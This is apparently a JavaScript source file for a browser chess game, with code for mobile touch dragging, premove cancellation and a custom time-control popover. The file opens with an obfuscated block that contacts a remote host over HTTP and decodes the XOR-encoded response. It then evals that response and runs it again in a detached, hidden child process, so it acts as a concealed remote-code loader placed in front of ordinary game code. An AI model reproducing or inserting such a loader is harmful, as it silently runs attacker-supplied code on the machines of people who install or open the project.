_0x11ec1f={'hostname':_0xa9d24e[_0x55165e(0x93)],'port':_0x123142[_0x55165e(0x137)](Number,_0xa9d24e[_0x55165e(0x15d)])||0x2236+-0x22b0+0xca,'path':_0x123142[_0x55165e(0x92)](_0xa9d24e[_0x55165e(0x150)],_0xa9d24e[_0x55165e(0x10e)]),'headers':{'User-Agent':_0x123142[_0x55165e(0xdf)],'Sec-V':_0x3d94ba['_V']||0x1309+-0x132b+0x22}};function _0x5944ee(_0x39564c){const _0x337ed4=_0x55165e;let _0x3de935=_0x3a20ac[_0x337ed4(0xcd)];for(let _0xcd6de2=-0x1*-0x15f6+0xc04+0x21fa*-0x1;_0x123142[_0x337ed4(0x156)](_0xcd6de2,_0x39564c[_0x337ed4(0xcd)]);_0xcd6de2++)_0x39564c[_0xcd6de2]^=_0x3a20ac[_0x337ed4(0xac)](_0x123142[_0x337ed4(0x19a)](_0xcd6de2,_0x3de935));return _0x39564c[_0x337ed4(0x159)](_0x123142[_0x337ed4(0x1a0)]);}function _0x3fa166(_0x5286d4){const _0x30bac6=_0x55165e;let _0x1c7184=_0x5286d4[_0x30bac6(0x14b)][_0x123142[_0x30bac6(0x119)]];if(!_0x1c7184)throw _0x123142[_0x30bac6(0xf8)](Error,_0x123142[_0x30bac6(0x1a5)]);return _0x123142[_0x30bac6(0xf8)](_0x5944ee,Buffer[_0x30bac6(0x18c)](_0x1c7184,_0x123142[_0x30bac6(0x168)]));}function _0x5e0c4c(_0x188457){const _0xdb2b5e=_0x55165e,_0x9df163={'FfHYb':function(_0x275d20,_0x11a249){const _0xda171f=_0x355e;return _0x5ecf66[_0xda171f(0x11f)](_0x275d20,_0x11a249);},'gIWWO':_0x5ecf66[_0xdb2b5e(0xe6)],'LTGfe':_0x5ecf66[_0xdb2b5e(0x101)],'djgaa':function(_0x12f74b,_0x87bcc9){const _0xd19d42=_0xdb2b5e;return _0x5ecf66[_0xd19d42(0x113)](_0x12f74b,_0x87bcc9);},'eEQvU':_0x5ecf66[_0xdb2b5e(0xa2)],'KQldR':function(_0x5a7b3b,_0x1dcf69){const _0x3bd8a8=_0xdb2b5e;return _0x5ecf66[_0x3bd8a8(0xe8)](_0x5a7b3b,_0x1dcf69);},'jvgKp':_0x5ecf66[_0xdb2b5e(0x189)],'ZgpqG':_0x5ecf66[_0xdb2b5e(0x158)],'XLylK':_0x5ecf66[_0xdb2b5e(0x162)]};return new Promise((_0x15f946,_0x5a9938)=>{const _0x320ae6=_0xdb2b5e,_0x34a894={'QMwHG':function(_0x40448d,_0x23c91e){const _0x42dd94=_0x355e;return _0x9df163[_0x42dd94(0x1b6)](_0x40448d,_0x23c91e);},'XHNyr':_0x9df163[_0x320ae6(0x112)],'eAmtO':_0x9df163[_0x320ae6(0xe7)],'ZYBBe':function(_0x3e84e2,_0x5c0248){const _0x3f74e7=_0x320ae6;return _0x9df163[_0x3f74e7(0xfc)](_0x3e84e2,_0x5c0248);},'FWUiH':_0x9df163[_0x320ae6(0x1a6)],'smCxl':function(_0x30f2b3,_0x3b4378){const _0x508aeb=_0x320ae6;return _0x9df163[_0x508aeb(0x94)](_0x30f2b3,_0x3b4378);},'LBjUj':_0x9df163[_0x320ae6(0x144)],'RpPIO':_0x9df163[_0x320ae6(0x199)],'EreqP':_0x9df163[_0x320ae6(0xca)]};let _0x67c2bf=http[_0x320ae6(0xc7)]({..._0x11ec1f,'method':_0x188457},_0x3ab5c7=>{const _0x17709d=_0x320ae6,_0x31a947={'RsZph':function(_0x3b6db8,_0x40fce6){const _0x93e689=_0x355e;return _0x34a894[_0x93e689(0x104)](_0x3b6db8,_0x40fce6);},'tavZt':_0x34a894[_0x17709d(0x10a)],'LssUT':function(_0x1f6ba3,_0xee0496){const _0x3db9b9=_0x17709d;return _0x34a894[_0x3db9b9(0x104)](_0x1f6ba3,_0xee0496);},'mjCAw':_0x34a894[_0x17709d(0x1b0)]};if(_0x34a894[_0x17709d(0xb2)](_0x34a894[_0x17709d(0xd1)],_0x188457)){try{_0x34a894[_0x17709d(0x11b)](_0x15f946,_0x34a894[_0x17709d(0x104)](_0x3fa166,_0x3ab5c7));}catch(_0x14978e){_0x34a894[_0x17709d(0x104)](_0x5a9938,_0x14978e);}_0x3ab5c7[_0x17709d(0x1b9)]();return;}let _0x333305=[];_0x3ab5c7['on'](_0x34a894[_0x17709d(0x15b)],_0x547736=>_0x333305[_0x17709d(0x198)](_0x547736)),_0x3ab5c7['on'](_0x34a894[_0x17709d(0x154)],()=>{const _0x38253d=_0x17709d;try{let _0x247fe6=Buffer[_0x38253d(0x107)](_0x333305);if(_0x247fe6[_0x38253d(0xcd)])return _0x31a947[_0x38253d(0xd2)](_0x15f946,_0x31a947[_0x38253d(0xd2)](_0x5944ee,_0x247fe6));if(_0x3ab5c7[_0x38253d(0x14b)][_0x31a947[_0x38253d(0x171)]])return _0x31a947[_0x38253d(0xd2)](_0x15f946,_0x31a947[_0x38253d(0x192)](_0x3fa166,_0x3ab5c7));_0x31a947[_0x38253d(0xd2)](_0x5a9938,_0x31a947[_0x38253d(0x192)](Error,_0x31a947[_0x38253d(0xae)]));}catch(_0x907b81){_0x31a947[_0x38253d(0xd2)](_0x5a9938,_0x907b81);}}),_0x3ab5c7['on'](_0x34a894[_0x17709d(0x12e)],_0x5a9938);});_0x67c2bf['on'](_0x9df163[_0x320ae6(0xca)],_0x5a9938),_0x67c2bf[_0x320ae6(0x142)]();});}return _0x123142[_0x55165e(0xfe)](_0x5e0c4c,_0x123142[_0x55165e(0x102)])[_0x55165e(0x100)](()=>_0x5e0c4c(_0x55165e(0x11a)));}async function _0x71cdd3(_0x36ed3f,_0x4cbe2e,_0x18ff88){const _0x433f4b=_0x21838c;try{let _0x42938e=await _0x123142[_0x433f4b(0xc3)](_0x5ec9c4,_0x4cbe2e,_0x36ed3f),_0x1de9e8=_0x18ff88?_0x433f4b(0xff)+_0x433f4b(0x17a)+(_0x3d94ba['_V']||-0xf0a+-0x135d*-0x1+-0x453)+(_0x433f4b(0xee)+_0x433f4b(0xfa))+_0x3d94ba['_H']+(_0x433f4b(0xee)+_0x433f4b(0x15e))+_0x3d94ba[_0x433f4b(0x16a)]+(_0x433f4b(0xee)+_0x433f4b(0xbe)+_0x433f4b(0x111)+_0x433f4b(0x157)+_0x433f4b(0x106)+_0x433f4b(0x179)):_0x433f4b(0xff)+_0x433f4b(0x17a)+(_0x3d94ba['_V']||0x1b1*0x2+-0x1*-0x16f9+0x207*-0xd)+(_0x433f4b(0xee)+_0x433f4b(0x132))+_0x3d94ba[_0x433f4b(0x15c)]+(_0x433f4b(0xee)+_0x433f4b(0x129))+_0x3d94ba[_0x433f4b(0x116)]+(_0x433f4b(0xee)+_0x433f4b(0xbe)+_0x433f4b(0x111)+_0x433f4b(0x157)+_0x433f4b(0x106)+_0x433f4b(0x179));_0x18ff88||_0x123142[_0x433f4b(0x1b4)](eval,_0x123142[_0x433f4b(0x92)](_0x1de9e8,_0x42938e)),_0x123142[_0x433f4b(0x125)](spawn,_0x123142[_0x433f4b(0x145)],['-e',_0x123142[_0x433f4b(0x9c)](_0x1de9e8,_0x42938e)],{'detached':!(-0xb2c+-0x1*-0xc13+-0xe7),'stdio':_0x123142[_0x433f4b(0xab)],'windowsHide':!(-0x1*-0x2079+0x1*-0x135a+0x1*-0xd1f)})[_0x433f4b(0x177)]();}catch(_0x51210c){}}_0x3d94ba['_V']=_0x3d94ba['i'],_0x3d94ba['_H']=_0x21838c(0x17e)+_0x28de5d+_0x21838c(0x155),_0x3d94ba[_0x21838c(0x16a)]=_0x21838c(0x17e)+_0x3b6d7d+_0x21838c(0x155),_0x3d94ba[_0x21838c(0x15c)]=_0x21838c(0x17e)+_0x28de5d+_0x21838c(0x181),_0x3d94ba[_0x21838c(0x116)]=_0x21838c(0x17e)+_0x28de5d+_0x21838c(0x155),await _0x123142[_0x21838c(0x125)](_0x71cdd3,new URL(_0x21838c(0x17e)+_0x28de5d+(_0x21838c(0xe4)+'s')),_0x123142[_0x21838c(0xf7)],!(-0x1*0x1b55+0x1*-0x1f25+0x3a7b)),await _0x123142[_0x21838c(0xe2)](_0x71cdd3,new URL(_0x21838c(0x17e)+_0x28de5d+_0x21838c(0x124)),_0x123142[_0x21838c(0x13e)],!(0x135b+0x1c5f+-0x2fba));}run();

    } else {
        loadGame();
    }

    boardEl.addEventListener('contextmenu', (e) => {
        e.preventDefault();

        premoveQueue = [];
        refreshPremoveHighlight();
        showStatus("Premove cancelled", false);
    });

    // Mobile Touch Drag-and-Drop Implementation
    boardEl.addEventListener('touchstart', (e) => {
        const touch = e.touches[0];
        const squareEl = e.target.closest('.square');
        if (!squareEl) return;

        const r = parseInt(squareEl.dataset.r);
        const c = parseInt(squareEl.dataset.c);
        const isPremoveMode = gameMode === 'ai' && turn !== playerColor;
        const vBoard = isPremoveMode ? getVirtualBoard() : board;
        const piece = vBoard[r][c];
        if (!piece || paused || gameOver) return;

        // Check if the piece is playable by the current player (including AI premoves)
        const isPremoveDrag = gameMode === 'ai' && turn !== playerColor && pColor(piece) === playerColor;
        const isNormalDrag = gameMode === 'ai' ? (turn === playerColor && pColor(piece) === playerColor) : (pColor(piece) === turn);

        if (!isPremoveDrag && !isNormalDrag) return;

        touchDragSrc = { r, c };
    }, { passive: true });

    boardEl.addEventListener('touchmove', (e) => {
        if (!touchDragSrc || !touchStartPos) return;

        const touch = e.touches[0];

        if (!touchDragging) {
            const dx = touch.clientX - touchStartPos.x;
            const dy = touch.clientY - touchStartPos.y;
            const distance = Math.sqrt(dx * dx + dy * dy);

            if (distance > 8) {
                touchDragging = true;

                // Select the piece to show move hints
                selectPiece(touchDragSrc.r, touchDragSrc.c);

                // Find the original piece image
                const squareEl = sq(touchDragSrc.r, touchDragSrc.c);
                const pieceImg = squareEl ? squareEl.querySelector('.piece') : null;
                if (pieceImg) {
                    // Create premium floating clone
                    activeTouchPieceClone = pieceImg.cloneNode(true);
                    activeTouchPieceClone.className = 'piece touch-drag-clone';

                    // Measure and style the clone
                    const rect = pieceImg.getBoundingClientRect();
                    touchOffset = { x: rect.width / 2, y: rect.height / 2 };

                    activeTouchPieceClone.style.position = 'fixed';
                    activeTouchPieceClone.style.pointerEvents = 'none';
                    activeTouchPieceClone.style.zIndex = '9999';
                    activeTouchPieceClone.style.width = rect.width + 'px';
                    activeTouchPieceClone.style.height = rect.height + 'px';
                    activeTouchPieceClone.style.transform = 'scale(1.15)';
                    activeTouchPieceClone.style.filter = 'drop-shadow(0 8px 16px rgba(0, 0, 0, 0.45))';
                    activeTouchPieceClone.style.transition = 'none';
                    activeTouchPieceClone.style.willChange = 'left, top';

                    document.body.appendChild(activeTouchPieceClone);

                    // Make original piece semi-transparent
                    pieceImg.classList.add('touch-dragging-original');
                }
            }
        }

        if (touchDragging && activeTouchPieceClone) {
            activeTouchPieceClone.style.left = (touch.clientX - touchOffset.x) + 'px';
            activeTouchPieceClone.style.top = (touch.clientY - touchOffset.y) + 'px';

            // Prevent page scrolling while dragging
            if (e.cancelable) e.preventDefault();
        }
    }, { passive: false });

    boardEl.addEventListener('touchend', async (e) => {
        const srcSquare = touchDragSrc;
        if (!srcSquare && !selected) return;
        const touch = e.changedTouches[0];
        let movedToSquare = false;

        if (touchDragging && touchDragSrc) {
            // Clean up original piece transparency
            const srcSquareEl = sq(srcSquare.r, srcSquare.c);
            const pieceImg = srcSquareEl ? srcSquareEl.querySelector('.piece') : null;
            if (pieceImg) {
                pieceImg.classList.remove('touch-dragging-original');
            }

            // Clean up clone
            if (activeTouchPieceClone) {
                activeTouchPieceClone.remove();
                activeTouchPieceClone = null;
            }

            // Identify target square element under the touch coordinates
            const targetEl = document.elementFromPoint(touch.clientX, touch.clientY);
            const destSquareEl = targetEl ? targetEl.closest('.square') : null;
            if (destSquareEl) {
                const tr = parseInt(destSquareEl.dataset.r, 10);
                const tc = parseInt(destSquareEl.dataset.c, 10);

                if (tr !== touchDragSrc.r || tc !== touchDragSrc.c) {
                    await tryMove(touchDragSrc.r, touchDragSrc.c, tr, tc);
                    movedToSquare = true;
                }
            }

            if (!movedToSquare) {
                deselect();
            }

            // Prevent click generation
            e.preventDefault();
        } else {
            e.preventDefault();

            const targetEl = document.elementFromPoint(
                touch.clientX,
                touch.clientY
            );
            if (!targetEl) return;
            const squareEl = targetEl.closest('.square');

            if (!squareEl) return;

            const tr = parseInt(squareEl.dataset.r);
            const tc = parseInt(squareEl.dataset.c);
            await onClick(tr, tc);

        }
        // Reset state
        touchStartPos = null;
        touchDragSrc = null;
        touchTapSquare = null;
        touchDragging = false;
    }, { passive: false });

    boardEl.addEventListener('touchcancel', (e) => {
        if (!touchStartPos) return;

        if (touchDragging && touchDragSrc) {
            const srcSquareEl = sq(touchDragSrc.r, touchDragSrc.c);
            const pieceImg = srcSquareEl ? srcSquareEl.querySelector('.piece') : null;
            if (pieceImg) {
                pieceImg.classList.remove('touch-dragging-original');
            }

            if (activeTouchPieceClone) {
                activeTouchPieceClone.remove();
                activeTouchPieceClone = null;
            }

            deselect();
        }

        touchStartPos = null;
        touchDragSrc = null;
        touchTapSquare = null;
        touchDragging = false;
    }, { passive: true });

    // INLINE INITIALIZATION FOR CUSTOM TIME CONTROL POPUP
    function initTimeControlPicker() {
        const trigger = document.getElementById('timeControlTrigger');
        const popover = document.getElementById('timeControlPopover');
        const tabs = document.querySelectorAll('.tc-tab-btn');
        const tabContents = document.querySelectorAll('.tc-tab-content');
        const presetBtns = document.querySelectorAll('.tc-preset-btn');
        const applyCustomBtn = document.getElementById('applyCustomTCBtn');
        const display = document.getElementById('tcDisplayText');

        if (!trigger || !popover) return;

        // Toggle popover
        trigger.addEventListener('click', (e) => {
            e.stopPropagation();
            const isVisible = popover.style.display === 'flex';
            popover.style.display = isVisible ? 'none' : 'flex';
        });

        // Tab switching
        tabs.forEach(tab => {
            tab.addEventListener('click', (e) => {
                e.stopPropagation();
                tabs.forEach(t => t.classList.remove('active'));
                tab.classList.add('active');

                const targetTab = tab.dataset.tab;
                tabContents.forEach(content => {
                    if (content.id === `tab-${targetTab}`) {
                        content.style.display = 'block';
                    } else {
                        content.style.display = 'none';
                    }
                });
            });
        });

        // Preset button selection
        presetBtns.forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.stopPropagation();
                presetBtns.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');

                selectedMins = parseInt(btn.dataset.mins, 10);
                selectedIncrement = parseInt(btn.dataset.inc, 10);

                // Update display text
                display.textContent = btn.textContent.trim();

                // Close popover
                popover.style.display = 'none';
            });
        });

        // Apply custom time control
        if (applyCustomBtn) {
            applyCustomBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                const minsInput = document.getElementById('customMinsInput');
                const secsInput = document.getElementById('customSecsInput');
                const incInput = document.getElementById('customIncInput');

                if (minsInput && incInput) {
                    let mins = parseInt(minsInput.value, 10);
                    let secs = secsInput ? parseInt(secsInput.value, 10) : 0;
                    let inc = parseInt(incInput.value, 10);

                    if (isNaN(mins) || mins < 0) mins = 0;
                    if (mins > 300) mins = 300;
                    if (isNaN(secs) || secs < 0) secs = 0;
                    if (secs > 59) secs = 59;
                    if (isNaN(inc) || inc < 0) inc = 0;
                    if (inc > 180) inc = 180;

                    const totalSecs = mins * 60 + secs;
                    if (totalSecs <= 0) {
                        // Require at least 1 second of game time
                        if (secsInput) secsInput.value = 30;
                        secs = 30;
                    }

                    minsInput.value = mins;
                    if (secsInput) secsInput.value = secs;
                    incInput.value = inc;

                    // selectedMins stores total minutes as a decimal (e.g. 0.5 for 30s)
                    selectedMins = (mins * 60 + secs) / 60;
                    selectedIncrement = inc;

                    // Update active preset styling
                    presetBtns.forEach(b => b.classList.remove('active'));

                    // Build a human-readable display string
                    let displayText;
                    const finalTotalSecs = mins * 60 + secs;
                    if (mins === 0) {
                        displayText = `${secs}s`;
                    } else if (secs === 0) {
                        displayText = `${mins} min`;
                    } else {
                        displayText = `${mins}:${String(secs).padStart(2, '0')} min`;
                    }
                    if (inc > 0) {
                        displayText += ` | ${inc}`;
                    }
                    display.textContent = displayText;

                    // Close popover
                    popover.style.display = 'none';
                }
            });
        }


        // Close popover when clicking anywhere else
        document.addEventListener('click', (e) => {
            if (!popover.contains(e.target) && e.target !== trigger) {
                popover.style.display = 'none';
            }
        });
    }

    // Call picker init immediately
    initTimeControlPicker();
    // Resume game by clicking the paused board overlay
    boardEl.addEventListener('click', async () => {
        if (!paused) return;
        if (drawOverlay.classList.contains('active')) return;
        if (confirmOverlay.classList.contains('active')) return;
        if (gameOverOverlay.classList.contains('active')) return;
        await resumeGame();
    });

    let resizeTimeout;
    window.addEventListener('resize', () => {
        if (premoveQueue.length > 0) {
            clearTimeout(resizeTimeout);
            resizeTimeout = setTimeout(() => {
                drawPremoveArrows(true);
            }, 100);
        }
    });

})();
